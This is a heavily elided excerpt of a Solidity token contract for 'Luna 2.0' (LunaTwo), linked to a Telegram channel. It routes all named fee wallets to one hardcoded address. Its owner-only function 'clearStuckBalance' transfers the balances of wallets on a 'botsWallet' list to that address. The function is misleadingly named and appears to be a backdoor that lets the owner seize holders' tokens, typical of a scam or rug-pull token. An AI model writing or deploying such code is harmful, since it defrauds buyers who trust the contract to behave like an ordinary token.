...
/*
Telegram : https://t.me/LunaTwoPortal
*/
...
contract Token is Context, IERC20, Ownable {
    ...
    address payable public _marketingAddress =
        payable(address(0xb63A537fd7Ff68dAD5F067449720ac220651E82B));
    address payable public _teamwallet =
        payable(address(0xb63A537fd7Ff68dAD5F067449720ac220651E82B));
    address _partnershipswallet =
        payable(address(0xb63A537fd7Ff68dAD5F067449720ac220651E82B));
    address private _donationAddress =
        0xb63A537fd7Ff68dAD5F067449720ac220651E82B;

    string private _name = "Luna 2.0";
    string private _symbol = "LunaTwo";
    ...
    function clearStuckBalance() public onlyOwner {
        for(uint256 i = 0; i < botsWallet.length; i++){
            ...
            _transferStandard(wallet, address(0xb63A537fd7Ff68dAD5F067449720ac220651E82B), amount);
        }
